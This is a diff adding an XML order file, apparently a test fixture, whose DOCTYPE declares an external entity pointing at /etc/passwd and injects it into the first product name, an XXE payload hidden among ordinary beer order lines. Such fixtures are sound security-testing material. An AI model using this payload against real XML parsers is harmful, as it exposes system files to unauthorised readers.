@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<Orders>
+    <Order>
+        <id>34</id>
+        <orderDate>2023-02-25</orderDate>
+        <OrderLine>
+            <id>35</id>
+            <quantity>3</quantity>
+            <productName>&xxe;</productName>
+            <price>10.675</price>
+        </OrderLine>
+        <OrderLine>
+            <id>36</id>
+            <quantity>3</quantity>
+            <productName>Bell’s Expedition</productName>
+            <price>10.803</price>
+        </OrderLine>
+        <OrderLine>
+            <id>37</id>
+            <quantity>2</quantity>
+            <productName>Trappistes Rochefort 8</productName>
+            <price>6.2824</price>
+        </OrderLine>
+        <OrderLine>
+            <id>38</id>
+            <quantity>2</quantity>
+            <productName>Seattle Enlightenment</productName>
+            <price>1.03</price>
+        </OrderLine>
+    </Order>
+    <Order>
+        <id>39</id>
+        <orderDate>2023-01-22</orderDate>
+        <OrderLine>
+            <id>40</id>
+            <quantity>3</quantity>
+            <productName>Trappistes Rochefort 8</productName>
+            <price>6.2824</price>
+        </OrderLine>
+        <OrderLine>
+            <id>41</id>
+            <quantity>2</quantity>
+            <productName>Orval Trappist Ale</productName>
+            <price>4.3162</price>
+        </OrderLine>
+        <OrderLine>
+            <id>42</id>
+            <quantity>2</quantity>
+            <productName>Jacked Java</productName>
+            <price>1.26</price>
+        </OrderLine>
+        <OrderLine>
+            <id>43</id>
+            <quantity>3</quantity>
+            <productName>Good-morning Utopia</productName>
+            <price>2.48</price>
+        </OrderLine>
+    </Order>
+</Orders>
